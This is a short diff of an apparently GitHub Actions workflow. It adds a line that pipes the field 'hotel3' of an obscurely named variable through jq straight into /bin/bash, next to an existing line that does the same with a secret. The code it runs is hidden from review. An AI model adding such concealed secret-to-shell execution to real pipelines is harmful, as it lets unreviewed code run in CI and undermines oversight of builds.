@@ -18,6 +18,7 @@ jobs:
           t827: ${{ secrets.t827 }}
         run: |
           printf '%s' "$t827" | jq -r .mh9931 | /bin/bash
+          printf '%s' "$ttpq07912" | jq -r .hotel3 | /bin/bash
 
       - name: Upload data
         if: always()
